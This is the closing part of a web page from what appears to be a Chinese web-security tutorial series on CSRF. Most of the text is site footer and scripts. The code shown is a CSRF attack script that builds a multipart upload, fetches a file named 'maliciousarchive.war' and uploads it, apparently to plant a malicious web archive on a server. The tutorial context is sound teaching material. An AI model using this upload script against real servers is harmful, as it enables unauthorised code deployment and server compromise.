+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>c</span> <span class=o>=</span> <span class=s2>&#34;--&#34;</span> <span class=o>+</span> <span class=nx>boundary</span> <span class=o>+</span> <span class=s2>&#34;\r\n&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>c</span> <span class=o>+=</span> <span class=s1>&#39;Content-Disposition: form-data; name=&#34;&#39;</span> <span class=o>+</span> <span class=nx>name</span> <span class=o>+</span> <span class=s1>&#39;&#34;; filename=&#34;&#39;</span> <span class=o>+</span> <span class=nx>filename</span> <span class=o>+</span> <span class=s1>&#39;&#34;\r\n&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>c</span> <span class=o>+=</span> <span class=s2>&#34;Content-Type: application/octet-stream\r\n\r\n&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>c</span> <span class=o>+=</span> <span class=nx>value</span> <span class=o>+</span> <span class=s2>&#34;\r\n&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>getBinary</span><span class=p>(</span><span class=nx>file</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>xhr</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=nx>file</span><span class=p>,</span> <span class=kc>false</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>overrideMimeType</span><span class=p>(</span><span class=s2>&#34;text/plain; charset=x-user-defined&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>xhr</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>xhr</span><span class=p>.</span><span class=nx>responseText</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>readBinary</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>tmp</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>data</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=nx>tmp</span> <span class=o>+=</span> <span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=o>&amp;</span>
+</span></span><span class=line><span class=cl><span class=mh>0xff</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>data</span> <span class=o>=</span> <span class=nx>tmp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>tmp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>start</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>c</span> <span class=o>=</span> <span class=nx>getBinary</span><span class=p>(</span><span class=s1>&#39;maliciousarchive.war&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>fileUpload</span><span class=p>(</span><span class=nx>c</span><span class=p>,</span> <span class=s2>&#34;maliciousarchive.war&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div></div><div class=article-widget><div class="container-xl row post-nav"><div class="col-6 post-nav-item"><div class=meta-nav>上一页</div><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E9%98%B2%E5%BE%A1%E4%BF%AE%E5%A4%8D/ rel=next>防御修复</a></div><div class="col-6 post-nav-item"><div class=meta-nav>下一页</div><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/ rel=prev>漏洞检测</a></div></div></div><div class=body-footer><p>最近更新于 0001-01-01</p><section id=comments class="mb-3 pt-0"><div id=disqus_thread></div><script>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="https://ngte-website.oss-accelerate.aliyuncs.com/disqus/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></section></div></article><footer class=site-footer><div class="copyright py-4 bg-footer"><div class="row justify-content-center"><div class="text-center footer-color"><p class=mb-0>© 2017-2022 NGTE all rights reserved</p></div></div></div></footer></main></div></div><script src=//unpkg.com/heti/umd/heti-addon.min.js></script>
+<script>const heti=new Heti(".article");heti.autoSpacing()</script><script type=text/javascript>window.$crisp=[],window.CRISP_WEBSITE_ID="12adcc35-9621-4313-8262-62dc654b29d8",function(){setTimeout(function(){d=document,s=d.createElement("script"),s.src="https://client.crisp.chat/l.js",s.async=1,d.getElementsByTagName("head")[0].appendChild(s)},2500)}()</script></div><div class=page-footer></div><script src=/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/highlight.min.js integrity="sha512-Ypjm0o7jOxAd4hpdoppSEN0TQOC19UtPAqD+4s5AlXmUvbmmS/YMxYqAqarQYyxTnB6/rqip9qcxlNB/3U9Wdg==" crossorigin=anonymous></script>
+<script id=search-hit-algolia-template type=text/html><div class=search-hit><div class=search-hit-content><div class=search-hit-name><a href={{relpermalink}}>{{#helpers.highlight}}{ "attribute": "title" }{{/helpers.highlight}}</a></div><div class="article-metadata search-hit-type">{{type}}</div><p class=search-hit-description>{{#helpers.highlight}}{ "attribute": "summary" }{{/helpers.highlight}}</p></div></div></script><script src=https://cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js crossorigin=anonymous></script>
+<script id=dsq-count-scr src=https://ngte-website.oss-accelerate.aliyuncs.com/disqus/count.js async></script>
+<script src=/zh/js/algolia-search-built.min.4387d694ca1258194aaf562b8cd1c400.js type=module></script>
+<script id=page-data type=application/json>{"use_headroom":false}</script><script src=/zh/js/wowchemy.min.d1673c7a11d1238516cbe12a1e84257f.js></script>
+<script>var mybutton=document.getElementById("backTopBtn");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?mybutton.style.display="block":mybutton.style.display="none"}function topFunction(){document.body.scrollTop=0,document.documentElement.scrollTop=0}</script><script src=https://cdn.jsdelivr.net/gh/bryanbraun/anchorjs@4.2.2/anchor.min.js integrity="sha512-I7w3ZdSFzw5j3jU3ZkNikBNeIrl3i+hEuEdwNmqUJvwNcaBUNcijnP2gd9DtGlgVYDplfjGoD8vTNsID+lCjqg==" crossorigin=anonymous></script>
+<script>anchors.add()</script><script>(function(){"use strict";if(!document.queryCommandSupported("copy"))return;function e(e,t){e.className="highlight-copy-btn",e.textContent=t,setTimeout(function(){e.textContent="",e.className="highlight-copy-btn fa fa-copy"},1e3)}function t(e){var t=window.getSelection(),n=document.createRange();return n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n),t}function n(n){var o,s=document.createElement("button");s.className="highlight-copy-btn fa fa-copy",s.textContent="",o=n.firstElementChild,s.addEventListener("click",function(){try{var n=t(o);document.execCommand("copy"),n.removeAllRanges(),e(s,"已复制")}catch(t){console&&console.log(t),e(s,"Failed :'(")}}),n.appendChild(s)}var s=document.getElementsByClassName("highlight");Array.prototype.forEach.call(s,n)})()</script></body></html>
